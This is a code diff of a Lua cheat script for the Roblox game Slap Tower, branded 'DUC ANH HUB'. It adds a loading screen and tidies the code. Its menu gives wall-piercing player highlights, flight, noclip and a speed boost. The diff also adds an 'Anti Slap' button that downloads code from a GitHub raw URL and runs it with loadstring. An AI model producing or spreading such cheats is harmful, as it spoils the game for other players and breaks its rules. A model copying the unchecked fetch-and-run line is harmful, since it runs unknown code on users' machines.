@@ -6,16 +6,14 @@ local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
 
--- 🔔 THÔNG BÁO KIỂM TRA
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "DUC ANH HUB v3.1",
-        Text = "Đã cập nhật Tab Info Rainbow cực cháy!",
+        Title = "DUC ANH HUB v1",
+        Text = "Có thể giúp bạn không bị troll!",
         Duration = 5
     })
 end)
 
--- Xóa GUI cũ nếu chạy đè
 pcall(function()
     if CoreGui:FindFirstChild("NutTronAnhV2") then
         CoreGui.NutTronAnhV2:Destroy()
@@ -36,9 +34,66 @@ if not success then
     gui.Parent = player:WaitForChild("PlayerGui")
 end
 
--- ==========================================
--- 🟢 1. NÚT TRÒN DI ĐỘNG (BỆ PHÕNG)
--- ==========================================
+-- LOADING SCREEN
+local LoadScreen = Instance.new("Frame")
+LoadScreen.Name = "LoadScreen"
+LoadScreen.Size = UDim2.new(0, 300, 0, 150)
+LoadScreen.Position = UDim2.new(0.5, -150, 0.5, -75)
+LoadScreen.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+LoadScreen.BackgroundTransparency = 0.1
+LoadScreen.Parent = gui
+
+Instance.new("UICorner", LoadScreen).CornerRadius = UDim.new(0, 16)
+
+local LoadStroke = Instance.new("UIStroke", LoadScreen)
+LoadStroke.Thickness = 2
+
+local loadConnection
+loadConnection = RunService.RenderStepped:Connect(function()
+    if not LoadScreen or not LoadScreen.Parent then
+        if loadConnection then loadConnection:Disconnect() end
+        return
+    end
+    local hue = (os.clock() % 4) / 4
+    LoadStroke.Color = Color3.fromHSV(hue, 1, 1)
+end)
+
+local LoadTitle = Instance.new("TextLabel")
+LoadTitle.Size = UDim2.new(1, 0, 0, 40)
+LoadTitle.Position = UDim2.new(0, 0, 0, 20)
+LoadTitle.BackgroundTransparency = 1
+LoadTitle.Text = "DucAnhHub"
+LoadTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadTitle.TextSize = 20
+LoadTitle.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
+LoadTitle.Parent = LoadScreen
+
+local BarBg = Instance.new("Frame")
+BarBg.Size = UDim2.new(0.85, 0, 0, 10)
+BarBg.Position = UDim2.new(0.075, 0, 0, 75)
+BarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+BarBg.BorderSizePixel = 0
+BarBg.Parent = LoadScreen
+Instance.new("UICorner", BarBg).CornerRadius = UDim.new(1, 0)
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
+BarFill.BorderSizePixel = 0
+BarFill.Parent = BarBg
+Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)
+
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(1, 0, 0, 30)
+PercentLabel.Position = UDim2.new(0, 0, 0, 95)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.Text = "Loading 0%"
+PercentLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+PercentLabel.TextSize = 12
+PercentLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium)
+PercentLabel.Parent = LoadScreen
+
+-- MAIN FRAME
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 50, 0, 50)
@@ -46,6 +101,7 @@ MainFrame.Position = UDim2.new(0.1, 0, 0.5, -25)
 MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 MainFrame.BackgroundTransparency = 0.3
 MainFrame.Active = true
+MainFrame.Visible = false
 MainFrame.Parent = gui
 
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(1, 0)
@@ -65,19 +121,16 @@ local FrameStroke = Instance.new("UIStroke", MainFrame)
 FrameStroke.Thickness = 3
 FrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
-local connection
-connection = RunService.RenderStepped:Connect(function()
+local mainConnection
+mainConnection = RunService.RenderStepped:Connect(function()
     if not MainFrame or not MainFrame.Parent then
-        if connection then connection:Disconnect() end
+        if mainConnection then mainConnection:Disconnect() end
         return
     end
     local hue = (os.clock() % 4) / 4
     FrameStroke.Color = Color3.fromHSV(hue, 1, 1)
 end)
 
--- ==========================================
--- 📂 2. GIAO DIỆN MENU & HỆ THỐNG TAB
--- ==========================================
 local MenuFrame = Instance.new("Frame")
 MenuFrame.Name = "MenuFrame"
 MenuFrame.Size = UDim2.new(0, 340, 0, 320)
@@ -95,7 +148,6 @@ local MenuStroke = Instance.new("UIStroke", MenuFrame)
 MenuStroke.Thickness = 2
 MenuStroke.Color = Color3.fromRGB(70, 130, 255)
 
--- Thanh bên trái (LeftBar)
 local LeftBar = Instance.new("Frame")
 LeftBar.Name = "LeftBar"
 LeftBar.Size = UDim2.new(0.22, 0, 1, 0)
@@ -104,8 +156,7 @@ LeftBar.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
 LeftBar.BorderSizePixel = 0
 LeftBar.Parent = MenuFrame
 
-local LeftBarCorner = Instance.new("UICorner", LeftBar)
-LeftBarCorner.CornerRadius = UDim.new(0, 18)
+Instance.new("UICorner", LeftBar).CornerRadius = UDim.new(0, 18)
 
 local UIListLayoutTab = Instance.new("UIListLayout")
 UIListLayoutTab.Padding = UDim.new(0, 10)
@@ -113,7 +164,6 @@ UIListLayoutTab.HorizontalAlignment = Enum.HorizontalAlignment.Center
 UIListLayoutTab.VerticalAlignment = Enum.VerticalAlignment.Center
 UIListLayoutTab.Parent = LeftBar
 
--- Tiêu đề Menu
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Size = UDim2.new(0.75, 0, 0, 50)
 TitleLabel.Position = UDim2.new(0.24, 10, 0, 0)
@@ -125,7 +175,6 @@ TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 TitleLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
 TitleLabel.Parent = MenuFrame
 
--- Nút tắt Menu (Dấu X)
 local CloseButton = Instance.new("TextButton")
 CloseButton.Size = UDim2.new(0, 28, 0, 28)
 CloseButton.Position = UDim2.new(1, -36, 0, 11)
@@ -137,7 +186,6 @@ CloseButton.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum
 CloseButton.Parent = MenuFrame
 Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(1, 0)
 
--- Khung chứa Container Tab
 local ContainerHolder = Instance.new("Folder")
 ContainerHolder.Parent = MenuFrame
 
@@ -146,7 +194,7 @@ local function createTabContainer()
     sf.Size = UDim2.new(0.75, -10, 1, -65)
     sf.Position = UDim2.new(0.24, 10, 0, 55)
     sf.BackgroundTransparency = 1
-    sf.CanvasSize = UDim2.new(0, 0, 0, 280)
+    sf.CanvasSize = UDim2.new(0, 0, 0, 320)
     sf.ScrollBarThickness = 3
     sf.Visible = false
     sf.Parent = ContainerHolder
@@ -158,8 +206,8 @@ local function createTabContainer()
     return sf
 end
 
-local Tab1Container = createTabContainer() -- Tab 1: Info
-local Tab2Container = createTabContainer() -- Tab 2: Slap Tower
+local Tab1Container = createTabContainer()
+local Tab2Container = createTabContainer()
 Tab1Container.Visible = true
 
 local function createTabButton(name, targetContainer)
@@ -183,9 +231,6 @@ end
 createTabButton("Info", Tab1Container)
 createTabButton("Slap Tower", Tab2Container)
 
--- ==========================================
--- 📄 NỘI DUNG TAB 1: INFO (RAINBOW TEXT)
--- ==========================================
 local InfoLabel = Instance.new("TextLabel")
 InfoLabel.Size = UDim2.new(1, 0, 0, 220)
 InfoLabel.BackgroundTransparency = 1
@@ -198,7 +243,6 @@ InfoLabel.TextYAlignment = Enum.TextYAlignment.Top
 InfoLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
 InfoLabel.Parent = Tab1Container
 
--- Hiệu ứng Rainbow cho chữ ở Tab Info
 local infoConnection
 infoConnection = RunService.RenderStepped:Connect(function()
     if not InfoLabel or not InfoLabel.Parent then
@@ -209,9 +253,6 @@ infoConnection = RunService.RenderStepped:Connect(function()
     InfoLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
 end)
 
--- ==========================================
--- 🛠️ NỘI DUNG TAB 2: SLAP TOWER (CHỨC NĂNG)
--- ==========================================
 local function createMenuButton(name, parentContainer, callback)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(1, 0, 0, 36)
@@ -234,7 +275,14 @@ local function createMenuButton(name, parentContainer, callback)
     return btn
 end
 
--- 1. Highlights
+createMenuButton("Anti Slap", Tab2Container, function(state)
+    if state then
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/amdzy088/Immune-slap-tower-/refs/heads/main/Immune%20slap%20tower%20work"))()
+        end)
+    end
+end)
+
 local espConnection
 createMenuButton("Highlights (Sáng người chơi)", Tab2Container, function(state)
     if state then
@@ -264,7 +312,6 @@ createMenuButton("Highlights (Sáng người chơi)", Tab2Container, function(st
     end
 end)
 
--- 2. Float
 local floatPart = nil
 createMenuButton("Float (Đi trên không)", Tab2Container, function(state)
     local char = player.Character
@@ -294,7 +341,6 @@ createMenuButton("Float (Đi trên không)", Tab2Container, function(state)
     end
 end)
 
--- 3. Noclip
 local noclipConnection
 createMenuButton("Noclip (Đi xuyên tường)", Tab2Container, function(state)
     if state then
@@ -321,16 +367,38 @@ createMenuButton("Noclip (Đi xuyên tường)", Tab2Container, function(state)
     end
 end)
 
--- 4. Speed x2
 createMenuButton("Speed x2", Tab2Container, function(state)
     pcall(function()
         player.Character.Humanoid.WalkSpeed = state and 32 or 16
     end)
 end)
 
--- ==========================================
--- 🛠️ 3. LOGIC KÉO THẢ & BẬT TẮT NÚT TRÒN
--- ==========================================
+task.spawn(function()
+    PercentLabel.Text = "Loading 30%"
+    TweenService:Create(BarFill, TweenInfo.new(0.4), {Size = UDim2.new(0.3, 0, 1, 0)}):Play()
+    task.wait(0.5)
+    
+    PercentLabel.Text = "Loading 70%"
+    TweenService:Create(BarFill, TweenInfo.new(0.4), {Size = UDim2.new(0.7, 0, 1, 0)}):Play()
+    task.wait(0.5)
+    
+    PercentLabel.Text = "Loading 100%"
+    TweenService:Create(BarFill, TweenInfo.new(0.3), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+    task.wait(0.4)
+    
+    if loadConnection then loadConnection:Disconnect() end
+    TweenService:Create(LoadScreen, TweenInfo.new(0.3), {BackgroundTransparency = 1, Size = UDim2.new(0, 0, 0, 0)}):Play()
+    for _, child in ipairs(LoadScreen:GetDescendants()) do
+        if child:IsA("TextLabel") or child:IsA("Frame") then
+            TweenService:Create(child, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+        end
+    end
+    task.wait(0.3)
+    LoadScreen:Destroy()
+    
+    MainFrame.Visible = true
+end)
+
 local dragging = false
 local dragInput, dragStart, startPos
 local isMoved = false
@@ -385,4 +453,4 @@ CloseButton.MouseButton1Click:Connect(function()
     MenuFrame.Visible = false
 end)
 
-print("🚀 Đã cập nhật Tab Info Rainbow thành công!")
+print("🚀 DUC ANH HUB v1 Loaded Successfully!")
